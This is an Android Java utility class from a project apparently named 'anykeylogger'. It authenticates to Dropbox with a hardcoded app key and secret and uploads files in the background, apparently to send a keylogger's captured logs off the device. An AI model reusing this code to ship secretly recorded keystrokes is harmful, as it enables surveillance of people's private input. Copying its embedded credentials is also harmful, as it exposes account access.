package com.radicalninja.anykeylogger;

import android.content.Context;
import android.os.AsyncTask;

import com.dropbox.client2.DropboxAPI;
import com.dropbox.client2.android.AndroidAuthSession;
import com.dropbox.client2.exception.DropboxException;
import com.dropbox.client2.session.AppKeyPair;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;

public class DropboxUtil {

    public interface DropboxCallback {
        public void onUploaded(DropboxAPI.Entry entry);
    }

    final static private String APP_KEY = "yhmtrpmv2aulexa";
    final static private String APP_SECRET = "mwqbqhk47pzv1ea";

    private Context mContext;

    private boolean mDBDidAuth = false;
    private DropboxAPI<AndroidAuthSession> mDBApi;

    public DropboxUtil(Context context) {
        mContext = context;
        setupDBSession();
    }

    private void setupDBSession() {
        AppKeyPair appKeys = new AppKeyPair(APP_KEY, APP_SECRET);
        String dbOauthToken = PreferencesManager.getInstance(mContext).getDbOauth();
        AndroidAuthSession session;
        if (!dbOauthToken.isEmpty()) {
            session = new AndroidAuthSession(appKeys, dbOauthToken);
        } else {
            session = new AndroidAuthSession(appKeys);
        }
        mDBApi = new DropboxAPI<>(session);
        if (!mDBApi.getSession().isLinked()) {
            mDBApi.getSession().startOAuth2Authentication(mContext);
            mDBDidAuth  = true;
        }
    }

    /**
     * Runs authentication finalization code. Call this in your activities' onResume() method.
     */
    public void finishAuthentication() {
        if (mDBDidAuth && mDBApi.getSession().authenticationSuccessful()) {
            try {
                mDBApi.getSession().finishAuthentication();
                String accessToken = mDBApi.getSession().getOAuth2AccessToken();
                PreferencesManager.getInstance(mContext).setDbOauth(accessToken);
                mDBDidAuth = false;
            } catch (IllegalStateException e) {
                e.printStackTrace();
            }
        }
    }

    private class DBFileUploadTask extends AsyncTask<Void, Void, DropboxAPI.Entry> {

        private File mFile;
        private String mDirectory;

        public DBFileUploadTask(File file, String targetDirectory) {
            mFile = file;
            if (!targetDirectory.startsWith("/")) {
                targetDirectory = String.format("/%s", targetDirectory);
            }
            if (!targetDirectory.endsWith("/")) {
                targetDirectory = String.format("%s/", targetDirectory);
            }
            mDirectory = targetDirectory;
        }

        @Override
        protected DropboxAPI.Entry doInBackground(Void... params) {
            try {
                FileInputStream inputStream = new FileInputStream(mFile);
                return mDBApi.putFile(
                        String.format("%s%s", mDirectory, mFile.getName()),
                        inputStream, mFile.length(), null, null
                );
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (DropboxException e) {
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPostExecute(DropboxAPI.Entry entry) {
            super.onPostExecute(entry);
        }
    }

}
